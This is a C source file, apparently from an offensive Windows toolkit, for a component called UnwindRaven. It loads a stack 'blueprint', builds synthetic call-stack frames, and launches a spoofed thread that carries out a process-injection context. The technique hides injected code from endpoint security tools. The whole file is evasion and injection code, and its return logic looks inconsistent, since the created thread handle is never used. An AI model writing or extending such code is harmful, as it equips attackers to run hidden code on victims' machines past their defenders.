#include "unwindraven_integration.h"
#include "dispatch.h"
#include <stdio.h>

#define UR_MAX_BP_ENTRIES   64
#define UR_MAX_STACK_FRAMES 64

static DWORD WINAPI SpoofedInvokeThunk(LPVOID param)
{
    PINJECTION_CONTEXT ctx = (PINJECTION_CONTEXT)param;
    DispatchInvoke(ctx);   // respects ctx->invokeFlavor
    return 0;
}

BOOL SpoofedInvoke_UnwindRaven(PINJECTION_CONTEXT ctx)
{
    StackProfileEntry blueprint[UR_MAX_BP_ENTRIES];
    int bpCount = 0;

    if (!LoadBlueprintFile("blueprint.txt", blueprint, &bpCount))
    {
        printf("[-] UnwindRaven: failed to load blueprint.\n");
        return FALSE;
    }

    UR_STACK_CONTEXT sctx = {0};
    StackFrame frames[UR_MAX_STACK_FRAMES];
    int frameCount = 0;

    if (!BuildSyntheticStackFromBlueprint(&sctx,
                                          blueprint,
                                          bpCount,
                                          frames,
                                          &frameCount))
    {
        printf("[-] UnwindRaven: failed to build synthetic stack.\n");
        return FALSE;
    }

    printf("[*] UnwindRaven: starting spoofed invoke thread.\n");

    HANDLE hSpoofed = StartSpoofedThread(
        frames,
        frameCount,
        (void*)SpoofedInvokeThunk,
        ctx,
        NULL,
        NULL,
        NULL
    );

    if (!hSpoofed)
    {
        printf("[-] UnwindRaven: failed to start spoofed thread.\n");
        return FALSE;
    }

    return (ctx->hThread != NULL);
}
